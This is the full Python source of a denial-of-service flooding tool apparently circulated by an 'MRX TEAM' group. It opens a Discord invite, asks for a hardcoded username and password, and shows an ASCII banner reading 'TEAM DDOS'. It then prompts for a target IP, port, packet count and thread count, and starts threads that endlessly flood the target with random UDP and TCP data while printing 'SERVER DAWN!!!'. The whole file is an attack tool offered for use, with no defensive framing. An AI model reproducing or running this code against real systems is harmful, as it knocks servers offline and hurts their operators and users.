import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to MRX-DDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'ZINOU' and password == 'ZINOU':
        print('You have successfully logged in Welcome to ZINOU!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[34m
	  AUTHOR TOOLS : MRX TEAM
	███████╗███████╗░█████╗░███╗░░░███  
╚══██╔══╝██╔════╝██╔══██╗████╗░████║
░░░██║░░░█████╗░░███████║██╔████╔██║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

""")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" PACKT :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"SERVER DAWN!!!")
		except:
			print("[!] ATTACK Sent!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SERVER DAWN!!!")
		except:
			s.close()
			print("[*] ATTACK sent!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SERVER DAWN!!!")
		except:
			s.close()
			print("[*] ATTACK SENT!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"SERVER DAWN!!!")
		except:
			s.close()
			print("[*] ATTACK SENT!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()
